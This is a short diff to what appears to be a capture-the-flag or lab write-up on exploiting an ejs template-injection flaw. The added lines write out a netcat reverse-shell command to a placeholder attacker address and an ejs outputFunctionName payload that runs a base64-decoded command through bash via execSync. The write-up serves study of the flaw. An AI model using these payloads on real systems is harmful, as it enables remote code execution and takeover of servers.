@@ -259,7 +259,7 @@ Upgrading <code>ejs</code> to version 3.1.7 or higher</p>
 
 ![image](https://github.com/user-attachments/assets/f583c7d5-b76f-4828-93d3-3ba1aa857ced)
 
-<p>busybox nc [Attack_IP] [Port]....</p>
+<pre><code>  busybox nc [Attack_IP] [Port] -e /bin/bash </code></pre><br>
 
 ![image](https://github.com/user-attachments/assets/cbb08e50-5d7c-4216-b366-91d947eb1774)
 
@@ -267,8 +267,7 @@ Upgrading <code>ejs</code> to version 3.1.7 or higher</p>
 
 <p>My payload = </p>
 
-<pre><code> name=Testing&passwords=Testing&settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('bash -c "echo [REDACTED]= | base64 -d | bash"');//
-</code></pre><br>
+<pre><code> name=Testing&passwords=Testing&settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('bash -c "echo [REDACTED]= | base64 -d | bash"');// </code></pre><br>
 
 ![image](https://github.com/user-attachments/assets/4eb12feb-e70a-4a53-9d45-8a9cd19f26d0)
 
